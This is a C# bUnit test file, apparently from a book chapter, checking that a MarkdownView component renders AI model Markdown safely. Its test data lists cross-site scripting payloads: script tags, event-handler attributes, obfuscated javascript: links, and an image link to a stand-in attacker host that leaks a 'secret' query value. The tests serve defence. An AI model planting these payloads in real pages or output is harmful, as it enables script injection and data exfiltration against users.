using Beacon.Desk.Ui;
using Bunit;

namespace Ch06.Tests;

/// <summary>MarkdownView renders a model's Markdown and nothing the model could use against the page.</summary>
public sealed class MarkdownViewTests : BunitContext
{
    public static TheoryData<string> HostileMarkdown =>
    [
        "<script>alert('x')</script>",
        "Hello <img src=x onerror=alert(1)>",
        "<iframe src=\"https://evil.example\"></iframe>",
        "<a href=\"javascript:alert(1)\">click</a>",
        "[click](javascript:alert(1))",
        "[click](JaVaScRiPt:alert(1))",
        "[click](&#106;avascript:alert(1))",
        "[click](vbscript:msgbox(1))",
        "[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
        "[click][ref]\n\n[ref]: javascript:alert(1)",
        "<javascript:alert(1)>",
        "![tracker](https://evil.example/pixel.png?d=secret)",

        // Generic attributes ({#id .class key=value}), part of UseAdvancedExtensions(), would turn these into
        // event handlers on the heading and the paragraph. The pipeline must keep leaving that extension out.
        "# Status {onmouseover=alert(1)}",
        "Hello {onclick=alert(2)}",
    ];

    [Theory]
    [MemberData(nameof(HostileMarkdown))]
    public void Hostile_input_produces_no_active_content(string markdown)
    {
        var view = Render<MarkdownView>(p => p.Add(x => x.Markdown, markdown));

        Assert.Empty(view.FindAll("script, img, iframe, object, embed, style"));
        Assert.All(view.FindAll("[href], [src]"), element =>
            Assert.True(SafeMarkdown.IsAllowedUrl(element.GetAttribute("href") ?? element.GetAttribute("src"))));
        Assert.DoesNotContain(
            view.FindAll("*").SelectMany(element => element.Attributes),
            attribute => attribute.Name.StartsWith("on", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void Raw_html_is_shown_as_text()
    {
        var view = Render<MarkdownView>(p => p.Add(x => x.Markdown, "Before <script>alert('x')</script> after"));

        Assert.Equal("Before <script>alert('x')</script> after", view.Find("p").TextContent);
    }

    [Fact]
    public void An_unsafe_link_keeps_its_words_and_loses_its_target()
    {
        var view = Render<MarkdownView>(p => p.Add(x => x.Markdown, "Please [confirm the visit](javascript:alert(1)) today."));

        Assert.Empty(view.FindAll("a"));
        Assert.Equal("Please confirm the visit today.", view.Find("p").TextContent);
    }

    [Fact]
    public void An_image_becomes_its_alt_text()
    {
        var view = Render<MarkdownView>(p => p.Add(x => x.Markdown, "![nameplate photo](https://contoso.example/eq-501.png)"));

        Assert.Equal("[image: nameplate photo]", view.Find(".bd-md-image").TextContent);
    }

    [Theory]
    [InlineData("[manual](https://contoso.example/manuals/ca-36x)", "https://contoso.example/manuals/ca-36x")]
    [InlineData("[dispatch](mailto:dispatch@contoso.example)", "mailto:dispatch@contoso.example")]
    [InlineData("See https://contoso.example/status for updates.", "https://contoso.example/status")]
    public void Safe_links_open_in_a_new_tab_without_an_opener(string markdown, string href)
    {
        var view = Render<MarkdownView>(p => p.Add(x => x.Markdown, markdown));

        var link = view.Find("a");
        Assert.Equal(href, link.GetAttribute("href"));
        Assert.Equal("noopener noreferrer nofollow", link.GetAttribute("rel"));
        Assert.Equal("_blank", link.GetAttribute("target"));
    }

    [Fact]
    public void Relative_links_are_refused()
    {
        var view = Render<MarkdownView>(p => p.Add(x => x.Markdown, "[settings](/admin/settings)"));

        Assert.Empty(view.FindAll("a"));
    }

    [Fact]
    public void Ordinary_markdown_still_renders()
    {
        var view = Render<MarkdownView>(p => p.Add(x => x.Markdown,
            "**CAP-45-5** first:\n\n1. Test it\n2. Replace it\n\n| SKU | Price |\n|---|---:|\n| CAP-45-5 | $38.50 |"));

        Assert.Equal("CAP-45-5", view.Find("strong").TextContent);
        Assert.Equal(2, view.FindAll("ol > li").Count);
        Assert.Equal("$38.50", view.Find("table td:last-child").TextContent);
    }
}
